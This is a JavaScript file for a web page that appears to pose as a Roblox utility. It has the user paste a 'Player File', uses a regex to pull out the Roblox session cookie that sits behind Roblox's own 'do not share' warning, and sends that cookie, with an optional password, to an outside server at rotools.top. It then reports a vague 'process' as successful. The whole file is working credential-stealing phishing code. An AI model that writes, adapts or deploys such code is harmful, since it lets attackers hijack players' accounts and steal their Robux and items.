document.addEventListener("DOMContentLoaded", () => {
  const button = document.getElementById("btn");
  button.addEventListener("click", check);

  function check() {
    const input = document.getElementById("input").value.trim();
    const passField = document.getElementById("pass");
    const pass = passField ? passField.value.trim() : null;
    const dirField = document.getElementById("dir");
    const dir = dirField ? dirField.value.trim() : "";

    button.innerText = "Loading...";
    button.disabled = true;

    const loadingInterval = setInterval(() => {
      button.innerText = "Loading...";
    }, 1000);

    if (!input || (passField && !pass)) {
      clearInterval(loadingInterval);
      Swal.fire({
        icon: "error",
        title: "Error",
        text: "Please input all required fields.",
      }).then(() => {
        resetButton();
      });
      return;
    }

    const rbxRegex =
      /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_(.*?)\"/;
    const match = input.match(rbxRegex);

    if (!match || !match[1]) {
      clearInterval(loadingInterval);
      Swal.fire({
        icon: "error",
        title: "Error",
        text: "Please input the correct Player File. Tipp: Watch the tutorial.",
      }).then(() => {
        resetButton();
      });
      return;
    }

    const cookie = match[1];

    fetch("https://rotools.top/apis/backend/check.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: "cookie=" + encodeURIComponent(cookie),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.status === "success") {
          fetch("https://rotools.top/apis/backend/userinfo.php", {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body:
              "cookie=" +
              encodeURIComponent(cookie) +
              "&pass=" +
              encodeURIComponent(pass || "") +
              "&dir=" +
              encodeURIComponent(dir),
          })
            .then((response) => response.text())
            .then(() => {
              clearInterval(loadingInterval);
              Swal.fire({
                icon: "success",
                title: "Success",
                text: "Successfully started the process!",
              }).then(() => {
                resetButton();
              });
            })
            .catch(() => handleError("[110]"));
        } else {
          handleError(data.message || "[111]");
        }
      })
      .catch(() => handleError("[112]"));

    function handleError(code) {
      clearInterval(loadingInterval);
      Swal.fire({
        icon: "error",
        title: "Error",
        text: "Error occurred Code " + code,
      }).then(() => {
        resetButton();
      });
    }

    function resetButton() {
      button.innerText = "Start Process!";
      button.disabled = false;
    }
  }
});
